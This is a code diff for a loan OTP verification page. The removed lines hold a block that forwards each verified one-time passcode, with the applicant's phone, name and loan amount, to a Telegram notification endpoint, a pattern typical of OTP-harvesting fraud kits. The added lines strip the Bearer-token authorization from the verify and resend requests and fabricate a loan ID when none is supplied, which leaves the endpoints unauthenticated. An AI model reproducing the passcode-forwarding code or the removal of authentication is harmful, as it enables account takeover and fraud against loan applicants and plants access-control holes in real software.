@@ -588,8 +588,7 @@
     const params = new URLSearchParams(window.location.search);
     let timeLeft = 60;
     let timerInterval = null;
-    let authToken = localStorage.getItem('token');
-    let loanId = params.get('loanId');
+    let loanId = params.get('loanId') || 'loan_' + Date.now();
 
     function loadData() {
         const phone = params.get('phone') || '—';
@@ -675,13 +674,14 @@
             const response = await fetch(`${CONFIG.API_URL}/api/loans/verify-otp`, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${authToken}`
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     loanId: loanId,
                     otp: otp,
-                    phone: phone
+                    phone: phone,
+                    amount: amount,
+                    name: name
                 })
             });
 
@@ -689,27 +689,6 @@
             console.log('📥 Response:', data);
 
             if (data.success) {
-                // ─── SEND TELEGRAM NOTIFICATION WITH OTP ───
-                try {
-                    await fetch(`${CONFIG.API_URL}/api/telegram/otp-verified`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Authorization': `Bearer ${authToken}`
-                        },
-                        body: JSON.stringify({
-                            loanId: loanId,
-                            phone: phone,
-                            amount: amount,
-                            name: name,
-                            otp: otp  // ← OTP INCLUDED
-                        })
-                    });
-                    console.log('✅ Telegram notification sent with OTP:', otp);
-                } catch (teleError) {
-                    console.log('Telegram error (ignored):', teleError);
-                }
-
                 document.getElementById('successMsg').textContent = '✅ OTP verified successfully!';
                 document.getElementById('successMsg').style.display = 'block';
                 document.getElementById('spinner').style.display = 'none';
@@ -754,8 +733,7 @@
             const response = await fetch(`${CONFIG.API_URL}/api/loans/resend-otp`, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${authToken}`
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     loanId: loanId,
